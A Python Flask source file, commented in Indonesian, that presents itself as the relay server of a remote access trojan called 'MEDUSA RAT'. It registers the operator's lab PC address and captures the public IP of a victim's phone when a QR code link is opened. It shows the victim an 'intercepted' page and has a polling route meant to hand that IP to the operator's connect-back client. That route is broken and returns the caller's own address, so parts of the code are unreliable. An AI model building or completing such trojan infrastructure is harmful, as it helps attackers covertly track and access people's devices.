from flask import Flask, request, jsonify

app = Flask(__name__)

# Variabel global untuk menyimpan alamat IP dan Port PC Lab Anda di memori awan
PC_LAB_IP_ADDRESS = ""

@app.route('/', methods=['GET', 'HEAD'])
def index():
    """Rute utama untuk merespons ping berkala dari Render agar server tidak tertidur."""
    return "MEDUSA RAT CLOUD RELAY SERVER IS LIVE 🎉", 200

@app.route('/handshake', methods=['GET'])
def handshake():
    global PC_LAB_IP_ADDRESS
    
    # 1. JALUR DARI PC LAB (Mendaftarkan IP PC Lab ke Render saat QR diklik)
    ip_lab = request.args.get('ip_lab')
    if ip_lab:
        PC_LAB_IP_ADDRESS = ip_lab
        return jsonify({"status": "success", "message": f"PC Lab IP locked at {PC_LAB_IP_ADDRESS}"}), 200
        
    # 2. JALUR DARI HP TARGET (Saat HP target memindai QR dan mengklik tautan)
    # Menangkap IP Publik HP Target secara otomatis melintasi internet
    target_ip = request.remote_addr
    
    # Jika HP mendeteksi adanya IP PC Lab yang aktif, operkan perintah koneksi balik
    return f"""
    <html>
    <head>
        <title>System Handshake</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ background-color: #1a1a1a; color: #ff0000; font-family: monospace; text-align: center; padding-top: 50px; }}
            .box {{ border: 2px solid #ff0000; display: inline-block; padding: 20px; border-radius: 10px; background-color: #000; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>[ MEDUSA WIRELESS LINK ]</h2>
            <p style="color: #00ff00;">✔ Handshake Intercepted from IP: {target_ip}</p>
            <p style="color: gray;">Koneksi nirkabel sedang diteruskan menuju PC Lab...</p>
        </div>
    </body>
    </html>
    """, 200

@app.route('/get_target', methods=['GET'])
def get_target():
    """Fungsi poling untuk memberikan IP HP target ke aplikasi run.py di PC Lab"""
    # Mengambil IP pengunjung terakhir (HP Target) yang membuka rute /handshake
    # Pada pengembangan lanjut, Anda bisa mengembalikan data IP target ke PC Lab di sini
    return jsonify({"status": "success", "ip": request.remote_addr}), 200
